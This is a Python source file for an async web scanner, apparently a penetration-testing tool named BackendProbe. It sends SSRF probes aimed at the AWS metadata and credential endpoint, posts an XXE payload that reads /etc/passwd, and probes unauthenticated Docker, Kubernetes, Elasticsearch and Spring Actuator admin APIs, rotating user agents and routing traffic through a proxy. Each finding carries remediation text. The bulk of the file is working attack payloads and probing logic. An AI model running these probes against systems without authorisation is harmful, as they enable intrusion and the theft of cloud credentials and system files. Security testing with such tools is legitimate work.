#!/usr/bin/env python3
"""BackendProbe v3 — fixes: only flag SSRF when confirmed, confidence floor, proxy."""
import asyncio, aiohttp, json, re, sys
from pathlib import Path
from urllib.parse import urlparse, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, is_truly_accessible, is_likely_real_vuln,
    delay, confidence_score, confidence_label, severity_from_confidence,
    meets_confidence_floor, random_ua, PROXY_URL, REQUEST_DELAY
)

EXPOSED_ADMIN_PATHS = [
    ("/_cat/indices","Elasticsearch indices"),("/_cluster/health","Elasticsearch health"),
    ("/api/overview","RabbitMQ management"),("/metrics","Prometheus metrics"),
    ("/v1/agent/self","Consul admin API"),("/info","Docker daemon API"),
    ("/api/v1/namespaces","Kubernetes API"),("/api/v1/pods","Kubernetes pods"),
    ("/containers/json","Docker containers"),("/actuator/env","Spring Boot Actuator ENV"),
]

SSRF_PARAMS = ['url','uri','src','source','href','link','fetch','load',
               'path','file','document','page','download','redirect',
               'target','dest','host','callback','webhook','endpoint','proxy']

class BackendProbe:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.host   = urlparse(target).hostname
        self.findings = []
        self.baseline_404 = ""

    async def _get(self, sess, url, headers=None):
        try:
            async with sess.get(url, headers=headers or {}, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=8),
                                allow_redirects=False) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, None, {}

    async def _post(self, sess, url, data=None, json_data=None, headers=None):
        try:
            kw = dict(headers=headers or {}, ssl=False, timeout=aiohttp.ClientTimeout(total=8))
            if json_data is not None: kw['json'] = json_data
            elif data is not None: kw['data'] = data
            async with sess.post(url, **kw) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, None, {}

    async def test_ssrf_params(self, sess):
        print("\n[*] Testing SSRF via URL parameters (proof-required)...")
        # Probe parameters that accept URLs
        test_endpoints = [
            self.target+'/api/fetch', self.target+'/api/proxy',
            self.target+'/api/webhook', self.target+'/api/screenshot',
        ]
        # AWS metadata — definitive SSRF proof if response contains these
        aws_sigs = ['ami-id','instance-id','iam/','security-credentials','meta-data']
        for endpoint in test_endpoints:
            for param in SSRF_PARAMS[:6]:
                for ssrf_target in ['http://169.254.169.254/latest/meta-data/']:
                    url = f"{endpoint}?{param}={quote(ssrf_target,safe='')}"
                    s, b, _ = await self._get(sess, url)
                    await delay()
                    if not b: continue
                    if any(sig in b.lower() for sig in aws_sigs):
                        if meets_confidence_floor(95):
                            self.findings.append({
                                'type':'SSRF_CLOUD_METADATA','severity':'CRITICAL','confidence':95,
                                'confidence_label':'High','url':url,'param':param,
                                'ssrf_target':ssrf_target,
                                'proof':f"Cloud metadata signatures found in response: {[s for s in aws_sigs if s in b.lower()][:3]}",
                                'detail':f"SSRF confirmed — cloud metadata fetched via param '{param}'",
                                'remediation':"Validate URLs against an allowlist. Block requests to 169.254.169.254 and all RFC1918 ranges.",
                            })
                            print(f"  [CRITICAL] SSRF cloud metadata via {param} at {endpoint}")

    async def test_xxe(self, sess):
        print("\n[*] Testing XXE injection on XML-accepting endpoints...")
        xxe_payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                       '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                       '<root><data>&xxe;</data></root>')
        for path in ['/api','/api/v1','/upload','/import','/parse','/xml','/soap']:
            url = self.target + path
            s, b, _ = await self._post(sess, url, data=xxe_payload,
                                       headers={"Content-Type":"application/xml"})
            await delay()
            if not b: continue
            if 'root:' in b and '/bin/' in b:
                if meets_confidence_floor(95):
                    self.findings.append({
                        'type':'XXE_INJECTION','severity':'CRITICAL','confidence':95,
                        'confidence_label':'High','url':url,
                        'proof':"/etc/passwd content (root: entry) returned in response",
                        'detail':f"XXE injection confirmed at {url}",
                        'remediation':"Disable external entity processing in XML parser. Use a security-hardened library.",
                    })
                    print(f"  [CRITICAL] XXE at {url} — /etc/passwd returned!")

    async def test_exposed_admin_apis(self, sess):
        print("\n[*] Probing for exposed internal admin APIs (200-only)...")
        for path, service in EXPOSED_ADMIN_PATHS:
            url = self.target + path
            s, b, hdrs = await self._get(sess, url)
            await delay()
            # Only flag if TRULY accessible (200 with real content)
            if is_truly_accessible(s) and is_likely_real_vuln(b or '', s, self.baseline_404, 200, 299):
                if meets_confidence_floor(85):
                    self.findings.append({
                        'type':'EXPOSED_ADMIN_API','severity':'CRITICAL','confidence':85,
                        'confidence_label':'High','url':url,'service':service,'size':len(b or ''),
                        'proof':f"HTTP {s} with {len(b or '')} bytes — {service} accessible without auth",
                        'detail':f"Internal admin API exposed: {service} at {path}",
                        'remediation':f"Bind {service} to localhost. Require auth for all admin endpoints.",
                    })
                    print(f"  [CRITICAL] {service}: {url} (HTTP {s})")
            elif s in [401, 403]:
                pass  # Protected correctly — not a finding

    async def run(self):
        print("="*60)
        print("  BackendProbe v3 — SSRF & Infrastructure Analyser")
        print("  Note: Only confirmed SSRF (with proof) is flagged")
        print("="*60)
        conn = aiohttp.TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=conn,
                timeout=aiohttp.ClientTimeout(total=60),
                proxy=PROXY_URL or None,
                headers={"User-Agent": random_ua()}) as sess:
            print("[*] Building 404 baseline...")
            self.baseline_404 = await build_baseline_404(sess, self.target)
            await self.test_ssrf_params(sess)
            await self.test_xxe(sess)
            await self.test_exposed_admin_apis(sess)
        return self.findings

def get_target():
    p = Path("reports/_target.txt")
    if p.exists(): return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u

def main():
    target = get_target()
    Path("reports").mkdir(exist_ok=True)
    findings = asyncio.run(BackendProbe(target).run())
    with open("reports/backendprobe.json",'w') as f: json.dump(findings,f,indent=2,default=str)
    print(f"\n[+] {len(findings)} findings -> reports/backendprobe.json")

if __name__ == '__main__': main()
